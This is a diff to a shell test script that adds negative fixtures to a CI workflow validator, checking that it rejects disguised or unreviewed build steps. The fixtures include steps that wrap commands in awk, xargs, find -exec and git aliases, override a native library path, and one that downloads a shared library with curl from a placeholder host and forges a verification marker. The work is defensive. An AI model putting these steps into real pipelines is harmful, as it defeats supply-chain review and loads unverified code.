@@ -307,6 +307,41 @@ replace_once \
   $'      - run: npm run build\n      - run: python3 -c \'import os; os.system(\"cargo test --locked --features symbiotic-memory-adapter\")\'\n\n  deps:\n'
 expect_failure python-os-system "$path" "opaque interpreter"
 
+path="$(new_fixture awk-system)"
+replace_once \
+  "$path" \
+  $'      - run: npm run build\n\n  deps:\n' \
+  $'      - run: npm run build\n      - run: awk \'BEGIN { system(\"cargo test --locked --features symbiotic-memory-adapter\") }\'\n\n  deps:\n'
+expect_failure awk-system "$path" "invokes unreviewed executable awk"
+
+path="$(new_fixture make-opaque)"
+replace_once \
+  "$path" \
+  $'      - run: npm run build\n\n  deps:\n' \
+  $'      - run: npm run build\n      - run: make adapter\n\n  deps:\n'
+expect_failure make-opaque "$path" "invokes unreviewed executable make"
+
+path="$(new_fixture xargs-shell)"
+replace_once \
+  "$path" \
+  $'      - run: npm run build\n\n  deps:\n' \
+  $'      - run: npm run build\n      - run: echo cargo | xargs -n 1\n\n  deps:\n'
+expect_failure xargs-shell "$path" "invokes unreviewed executable xargs"
+
+path="$(new_fixture find-exec)"
+replace_once \
+  "$path" \
+  $'      - run: npm run build\n\n  deps:\n' \
+  $'      - run: npm run build\n      - run: find . -exec ./unreviewed-runner \\;\n\n  deps:\n'
+expect_failure find-exec "$path" "invokes unreviewed executable find"
+
+path="$(new_fixture git-shell-alias)"
+replace_once \
+  "$path" \
+  $'      - run: npm run build\n\n  deps:\n' \
+  $'      - run: npm run build\n      - run: git -c alias.adapter=\'!cargo test --locked --features symbiotic-memory-adapter\' adapter\n\n  deps:\n'
+expect_failure git-shell-alias "$path" "invokes unreviewed executable git"
+
 path="$(new_fixture whitespace-insteadof)"
 replace_once \
   "$path" \
@@ -327,6 +362,34 @@ replace_once \
   $'      - name: fmt\n' \
   $'      - run: $(printf cargo) test --locked --features symbiotic-memory-adapter\n      - name: fmt\n'
 expect_failure command-substitution "$path" "unreviewed command substitution"
+
+path="$(new_fixture zvec-step-env-override)"
+replace_once \
+  "$path" \
+  $'      - name: fmt\n' \
+  $'      - name: override verified package\n        env:\n          ZVEC_LIB_DIR: /tmp/unverified-zvec\n        run: cargo test --locked --features symbiotic-memory-adapter --lib\n      - name: fmt\n'
+expect_failure zvec-step-env-override "$path" "workflow native provenance env ZVEC_LIB_DIR"
+
+path="$(new_fixture zvec-inline-override)"
+replace_once \
+  "$path" \
+  $'      - name: fmt\n' \
+  $'      - run: ZVEC_LIB_DIR=/tmp/unverified-zvec cargo test --locked --features symbiotic-memory-adapter --lib\n      - name: fmt\n'
+expect_failure zvec-inline-override "$path" "outside the reviewed preparation step"
+
+path="$(new_fixture forged-zvec-marker)"
+replace_once \
+  "$path" \
+  $'      - name: fmt\n' \
+  $'      - name: replace verified native package\n        run: |\n          mkdir -p /tmp/unverified-zvec\n          curl -fsSL https://example.invalid/libzvec_c_api.so -o /tmp/unverified-zvec/libzvec_c_api.so\n          printf \'symbiotic_memory_pin=f6e406abeb13f2c734c4001fbc0fdf72ba43308a\\ntarget=x86_64-unknown-linux-gnu\\n\' > /tmp/unverified-zvec/.membench-zvec-verified\n          ZVEC_LIB_DIR=/tmp/unverified-zvec cargo test --locked --features symbiotic-memory-adapter --lib\n      - name: fmt\n'
+expect_failure forged-zvec-marker "$path" "outside the reviewed preparation step"
+
+path="$(new_fixture mutate-prepared-zvec)"
+replace_once \
+  "$path" \
+  $'      - name: fmt\n' \
+  $'      - run: echo forged > \"$RUNNER_TEMP/symbiotic-memory-zvec/libzvec_c_api.so\"\n      - name: fmt\n'
+expect_failure mutate-prepared-zvec "$path" "outside the reviewed preparation step"
 
 path="$(new_fixture unprotected-adapter-job)"
 replace_once \
